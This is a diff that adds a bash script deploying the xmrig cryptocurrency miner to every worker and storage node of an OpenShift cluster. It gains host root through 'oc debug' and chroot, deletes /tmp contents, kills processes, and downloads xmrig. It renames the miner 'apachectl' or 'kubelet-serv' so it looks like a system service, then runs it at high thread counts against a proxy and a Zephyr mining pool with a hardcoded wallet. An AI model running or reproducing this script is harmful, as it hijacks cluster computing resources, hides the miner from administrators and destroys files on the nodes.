@@ -1,0 +1,69 @@
+#!/bin/bash
+
+# ------------------------ CONFIGURATION ------------------------
+
+proxy_ip="REPLACE_WITH_PROXY_IP"   # <- Set this to the OVN-K8s IP of the proxy node
+proxy_port="3333"
+
+# ------------------------ DETECT WORKER/STORAGE NODES ------------------------
+
+proxy_node=$(oc get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}' \
+  | grep -iE 'control-plane|master' | awk '{print $1; exit}')
+
+nodes=$(oc get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}' \
+  | awk -v exclude="$proxy_node" 'tolower($2) ~ /worker|storage/ && $1 != exclude {print $1}')
+
+if [[ -z "$nodes" ]]; then
+  echo "❌ No worker/storage nodes found to run xmrig."
+  exit 1
+fi
+
+# ------------------------ RUN XMRIG ON WORKER/STORAGE NODES ------------------------
+
+for node in $nodes; do
+  echo "💻 Starting xmrig miner on: $node"
+  worker_name=$(echo "$node" | awk -F'.' '{print $2}')
+  oc debug node/$node <<EOF
+    chroot /host
+    su -
+    cd /tmp
+
+    rm -rf *
+    pkill -9 kubelet-serv
+    pkill -9 apachectl
+    echo 4096 > /proc/sys/vm/nr_hugepages
+    sysctl -p
+
+    curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-23-0/xmrig-6.23.0-linux-static-x64.tar.gz
+    tar -xzvf xmrig-6.23.0-linux-static-x64.tar.gz
+    mv xmrig apachectl
+    nohup ./apachectl -a rx/0 -o $proxy_ip:$proxy_port -u $worker_name --tls -k --huge-pages --threads=32 --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+    exit
+    exit
+    exit
+EOF
+  echo "✅ xmrig miner started on: $node"
+done
+
+echo "🎉 All worker/storage nodes connected to proxy successfully."
+
+
+
+
+chroot /host
+echo "Entering chroot environment on $node"
+su -
+cd /tmp
+pkill -9 kubelet-serv
+rm -rf *
+curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-24-0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar -xzvf xmrig-6.24.0-linux-static-x64.tar.gz
+mv xmrig kubelet-serv
+(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((2048+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((2048+$(nproc))) \ && ./kubelet-serv -o de.zephyr.herominers.com:1124 -u solo:ZEPHs7UTrQPE5S1Rz7TGPkg2ZLuPhfbAa8RHbJ1o7URU8FW5pqmyvvFVyVX9KmwRz83iz1LwAKZ9hBt2isBzBhZxeyQopdbRknW.${region} -a rx/0 -B -S -k --tls --donate-level 0  --cpu-priority=0
+
+vm.nr_hugepages=128
+
+
+./kubelet-serv -o de.zephyr.herominers.com:1124 -u solo:ZEPHs7UTrQPE5S1Rz7TGPkg2ZLuPhfbAa8RHbJ1o7URU8FW5pqmyvvFVyVX9KmwRz83iz1LwAKZ9hBt2isBzBhZxeyQopdbRknW.demon -a rx/0 -B -S -k --donate-level 0 --cpu-priority=0
+
+ZEPHs7UTrQPE5S1Rz7TGPkg2ZLuPhfbAa8RHbJ1o7URU8FW5pqmyvvFVyVX9KmwRz83iz1LwAKZ9hBt2isBzBhZxeyQopdbRknW
